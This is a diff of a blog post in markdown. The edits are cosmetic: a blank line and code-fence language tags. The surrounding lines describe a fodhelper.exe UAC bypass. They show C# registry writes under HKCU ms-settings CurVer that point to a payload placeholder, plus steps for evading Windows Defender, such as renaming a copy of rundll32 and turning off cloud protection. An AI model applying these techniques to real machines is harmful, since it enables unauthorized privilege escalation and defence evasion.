@@ -16,6 +16,7 @@ Let's try out a console app that will make `fodhelper.exe` execute our payload, 
 > All of the projects created in this post are on my GitHub, check them out! Don't forget to turn off`Cloud-Delivered protection` and `Automatic sample submission`.
 {: .prompt-info }
 
+
 ```C#
 using System.Diagnostics;
 using Microsoft.Win32;
@@ -47,7 +48,7 @@ It seems like Windows Defender doesn't want to have executables in `(default)`. 
 
 The easiest way to do this would be to make it execute `rundll32 <DLL_NAME>`. Since I don't think Defender would be too happy with us making FodHelper run a binary from `%windir%\system32`, let's make a copy of `run32dll`. Our payload should now be `C:\temp\luci C:\temp\payload.dll`. Let's apply these revisions to our code
 
-```C#
+```csharp
 using System.Diagnostics;
 using Microsoft.Win32;
 // The full and improved code in this snippet above can be found on my GitHub
@@ -89,7 +90,7 @@ Upon reading the documentation, I have stumbled upon this:
 
 Looks fairly promising...let's see how it can be used. Consulting with StackExchange led me to this (post)[https://stackoverflow.com/questions/20974888/how-to-find-componentid-of-wscript-shell]. Finally, this should trick Defender into perceiving the registry untouched:
 
-```C#        
+```csharp  
 // Create the registry keys
 Registry.SetValue(@"HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer", "", ".redirect");
 Registry.SetValue(@"HKEY_CURRENT_USER\Software\Classes\.redirect\Shell\Open\command", "", <PAYLOAD>);
